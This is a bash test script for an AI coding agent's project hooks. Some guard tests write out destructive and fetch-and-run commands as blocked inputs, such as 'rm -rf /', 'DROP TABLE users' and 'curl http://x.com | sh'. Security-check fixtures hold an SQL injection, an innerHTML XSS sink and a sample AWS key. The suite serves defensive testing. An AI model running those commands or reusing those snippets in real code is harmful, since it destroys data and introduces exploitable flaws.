#!/usr/bin/env bash
# Hook test suite — run from the project root: bash .claude/tests/run-tests.sh
# Tests each hook for correct output and behavior without requiring a live Claude session.
set -uo pipefail

PASS=0
FAIL=0
SKIP=0

# ── Trap cleanup — runs on exit, Ctrl-C, or error ────────────────────────────
# Ensures test rows never persist in docs indexes, even on interrupted runs.
_cleanup() {
  # Remove any "Test Decision" rows from decisions index
  if [[ -f "docs/decisions/index.md" ]]; then
    grep -v "Test Decision" docs/decisions/index.md > docs/decisions/index.md.tmp \
      && mv docs/decisions/index.md.tmp docs/decisions/index.md \
      || rm -f docs/decisions/index.md.tmp
  fi
  # Remove any "Test Research Topic" rows from research index
  if [[ -f "docs/research/index.md" ]]; then
    grep -v "Test Research Topic" docs/research/index.md > docs/research/index.md.tmp \
      && mv docs/research/index.md.tmp docs/research/index.md \
      || rm -f docs/research/index.md.tmp
  fi
  # Remove temp decision/research files created by the test
  rm -f docs/decisions/*test-decision* docs/research/*test-topic* 2>/dev/null || true
}
trap _cleanup EXIT

GREEN='\033[32m' RED='\033[31m' YELLOW='\033[33m' RESET='\033[0m'

pass() { echo -e "${GREEN}✅${RESET} $1"; (( PASS++ )); }
fail() { echo -e "${RED}❌${RESET} $1"; (( FAIL++ )); }
skip() { echo -e "${YELLOW}⚠${RESET}  $1 (skipped)"; (( SKIP++ )); }

assert_valid_json() {
  local desc="$1" output="$2"
  if echo "$output" | jq . >/dev/null 2>&1; then
    pass "$desc"
  else
    fail "$desc — not valid JSON: $(echo "$output" | head -c 100)"
  fi
}

assert_contains() {
  local desc="$1" haystack="$2" needle="$3"
  if echo "$haystack" | grep -q "$needle"; then
    pass "$desc"
  else
    fail "$desc — expected to find: $needle"
  fi
}

assert_exit() {
  local desc="$1" expected="$2" actual="$3"
  if [[ "$actual" -eq "$expected" ]]; then
    pass "$desc"
  else
    fail "$desc — expected exit $expected, got $actual"
  fi
}

# ── Dependency check ──────────────────────────────────────────────────────────
if ! command -v jq >/dev/null 2>&1; then
  echo "jq not installed — required. Install: brew install jq"
  exit 1
fi

echo "=== claude-boilerplate hook tests ==="
echo ""

# ── session-start.sh ─────────────────────────────────────────────────────────
echo "--- session-start.sh ---"
OUT=$(bash .claude/hooks/session-start.sh 2>/dev/null)
assert_valid_json "produces valid JSON" "$OUT"
assert_contains    "contains additionalContext key" "$OUT" "additionalContext"
assert_contains    "contains AGENT MAP" "$OUT" "AGENT MAP"
assert_contains    "contains branch info" "$OUT" "Branch:"
# Verify session ID file was created
if [[ -f ".claude/.current-session-id" ]]; then
  pass "creates .current-session-id"
else
  fail "did not create .current-session-id"
fi

# ── session-logger.sh ────────────────────────────────────────────────────────
echo ""
echo "--- session-logger.sh ---"
SESSION_ID=$(cat .claude/.current-session-id 2>/dev/null || echo "no-session")
LOG_FILE=".claude/logs/sessions/${SESSION_ID}.jsonl"
bash .claude/hooks/session-logger.sh "test_event" '{"key":"value"}' 2>/dev/null
if [[ -f "$LOG_FILE" ]]; then
  LAST=$(tail -1 "$LOG_FILE")
  assert_valid_json "writes valid JSONL" "$LAST"
  assert_contains    "includes event type" "$LAST" "test_event"
  assert_contains    "includes session_id" "$LAST" "$SESSION_ID"
else
  fail "no log file found at $LOG_FILE"
fi

# ── guard-dangerous-bash.sh — blocks ─────────────────────────────────────────
echo ""
echo "--- guard-dangerous-bash.sh (blocks) ---"

run_guard() { echo "$1" | bash .claude/hooks/guard-dangerous-bash.sh 2>/dev/null; echo $?; }

assert_exit "blocks rm -rf /"   2 "$(run_guard '{"tool_input":{"command":"rm -rf /"}}')"
assert_exit "blocks rm -r /dir" 2 "$(run_guard '{"tool_input":{"command":"rm -r /important"}}')"
assert_exit "blocks rm -fR /"   2 "$(run_guard '{"tool_input":{"command":"rm -fR /"}}')"
assert_exit "blocks DROP TABLE (uppercase)" 2 "$(run_guard '{"tool_input":{"command":"DROP TABLE users"}}')"
assert_exit "blocks drop table (lowercase)" 2 "$(run_guard '{"tool_input":{"command":"drop table users"}}')"
assert_exit "blocks curl|sh"    2 "$(run_guard '{"tool_input":{"command":"curl http://x.com | sh"}}')"
assert_exit "blocks push main"  2 "$(run_guard '{"tool_input":{"command":"git push origin main"}}')"

echo ""
echo "--- guard-dangerous-bash.sh (allows) ---"
assert_exit "allows npm run build"  0 "$(run_guard '{"tool_input":{"command":"npm run build"}}')"
assert_exit "allows git status"     0 "$(run_guard '{"tool_input":{"command":"git status"}}')"
assert_exit "allows push with env var" 0 "$(ALLOW_PUSH_MAIN=1 run_guard '{"tool_input":{"command":"git push origin main"}}')"

# ── pre-compact.sh ────────────────────────────────────────────────────────────
echo ""
echo "--- pre-compact.sh ---"
OUT=$(bash .claude/hooks/pre-compact.sh 2>/dev/null)
assert_valid_json "produces valid JSON" "$OUT"
assert_contains    "contains additionalContext" "$OUT" "additionalContext"
assert_contains    "mentions preservation" "$OUT" "preserve"

# ── trigger-code-review.sh ───────────────────────────────────────────────────
echo ""
echo "--- trigger-code-review.sh ---"
QUEUE=".claude/.review-queue.txt"
: > "$QUEUE"

run_trigger() { echo "$1" | bash .claude/hooks/trigger-code-review.sh 2>/dev/null; }

run_trigger '{"tool_input":{"file_path":"src/Button.tsx"}}'
if grep -q "src/Button.tsx" "$QUEUE" 2>/dev/null; then
  pass "queues .tsx source files"
else
  fail "did not queue src/Button.tsx"
fi

run_trigger '{"tool_input":{"file_path":"src/Button.test.tsx"}}'
if grep -q "Button.test.tsx" "$QUEUE" 2>/dev/null; then
  fail "should not queue test files"
else
  pass "skips test files"
fi

run_trigger '{"tool_input":{"file_path":"docs/README.md"}}'
if grep -q "README.md" "$QUEUE" 2>/dev/null; then
  fail "should not queue docs files"
else
  pass "skips docs files"
fi

run_trigger '{"tool_input":{"file_path":"server/routes/users.ts"}}'
if grep -q "server/routes/users.ts" "$QUEUE" 2>/dev/null; then
  pass "queues server .ts files"
else
  fail "did not queue server/routes/users.ts"
fi

: > "$QUEUE"

# ── security-check.sh ────────────────────────────────────────────────────────
echo ""
echo "--- security-check.sh ---"
SEC_TMP=$(mktemp -d)
run_sec() { # $1 = file path; prints hook stdout
  jq -n --arg fp "$1" '{"tool_input":{"file_path":$fp}}' \
    | bash .claude/hooks/security-check.sh 2>/dev/null
}

printf 'const q = `SELECT * FROM users WHERE id = ${userId}`;\n' > "$SEC_TMP/sqli.ts"
OUT=$(run_sec "$SEC_TMP/sqli.ts")
assert_contains "flags SQL template interpolation" "$OUT" "A03 sqli"
assert_valid_json "sqli warning is valid JSON" "$OUT"

printf 'const apiKey = "AKIAIOSFODNN7EXAMPLE1";\n' > "$SEC_TMP/secret.ts"
OUT=$(run_sec "$SEC_TMP/secret.ts")
assert_contains "flags hardcoded AWS key" "$OUT" "A02 secrets"

printf 'el.innerHTML = userInput;\n' > "$SEC_TMP/xss.ts"
OUT=$(run_sec "$SEC_TMP/xss.ts")
assert_contains "flags innerHTML sink" "$OUT" "A03 xss"

printf 'const ids = rows.map((r) => r.id);\nexport default ids;\n' > "$SEC_TMP/clean.ts"
OUT=$(run_sec "$SEC_TMP/clean.ts")
if [[ -z "$OUT" ]]; then
  pass "clean file produces no output"
else
  fail "clean file should produce no output, got: $(echo "$OUT" | head -c 80)"
fi

printf 'password = "supersecretvalue1"\n' > "$SEC_TMP/note.md"
OUT=$(run_sec "$SEC_TMP/note.md")
if [[ -z "$OUT" ]]; then
  pass "skips non-source files (.md)"
else
  fail ".md file should be skipped"
fi
rm -rf "$SEC_TMP"

# ── prompt-logger.sh ─────────────────────────────────────────────────────────
echo ""
echo "--- prompt-logger.sh ---"
BEFORE=$(wc -l < "$LOG_FILE" 2>/dev/null || echo "0")
echo '{"prompt":"hello world"}' | bash .claude/hooks/prompt-logger.sh 2>/dev/null
AFTER=$(wc -l < "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$AFTER" -gt "$BEFORE" ]]; then
  LAST=$(tail -1 "$LOG_FILE")
  assert_valid_json "writes valid JSONL" "$LAST"
  assert_contains   "includes user_prompt event" "$LAST" "user_prompt"
  if echo "$LAST" | jq -e '.data.input_tokens_approx' >/dev/null 2>&1; then
    fail "should NOT include input_tokens_approx (removed as misleading)"
  else
    pass "does not include misleading token estimate"
  fi
else
  fail "did not write a log entry"
fi

# ── doc structure scripts ────────────────────────────────────────────────────
echo ""
echo "--- .claude/scripts/ ---"
chmod +x .claude/scripts/new-research.sh .claude/scripts/new-decision.sh 2>/dev/null

if [[ -d "docs/research" ]]; then
  RESEARCH_FILE=$(bash .claude/scripts/new-research.sh "test-topic" "Test Research Topic" "High" 2>/dev/null)
  if [[ -f "$RESEARCH_FILE" ]]; then
    pass "new-research.sh creates file at correct path"
    if grep -q "Test Research Topic" "$RESEARCH_FILE"; then
      pass "new-research.sh writes title into file"
    else
      fail "new-research.sh: title not in file"
    fi
    if grep -q "test-topic" docs/research/index.md 2>/dev/null; then
      pass "new-research.sh appends to index"
    else
      fail "new-research.sh: index not updated"
    fi
    rm -f "$RESEARCH_FILE"
    # Index cleanup is handled by the EXIT trap
  else
    fail "new-research.sh: file not created"
  fi
else
  skip "new-research.sh (docs/research/ not found)"
fi

if [[ -d "docs/decisions" ]]; then
  DECISION_FILE=$(bash .claude/scripts/new-decision.sh "test-decision" "Test Decision" 2>/dev/null)
  if [[ -f "$DECISION_FILE" ]]; then
    pass "new-decision.sh creates file at correct path"
    if grep -q "Test Decision" "$DECISION_FILE"; then
      pass "new-decision.sh writes title into file"
    else
      fail "new-decision.sh: title not in file"
    fi
    rm -f "$DECISION_FILE"
    # Index cleanup is handled by the EXIT trap
  else
    fail "new-decision.sh: file not created"
  fi
else
  skip "new-decision.sh (docs/decisions/ not found)"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo "=== Results ==="
echo -e "${GREEN}Passed:${RESET}  $PASS"
echo -e "${RED}Failed:${RESET}  $FAIL"
echo -e "${YELLOW}Skipped:${RESET} $SKIP"
echo ""
[[ "$FAIL" -eq 0 ]] && echo -e "${GREEN}All tests passed.${RESET}" \
  || echo -e "${RED}${FAIL} test(s) failed.${RESET}"
exit "$FAIL"
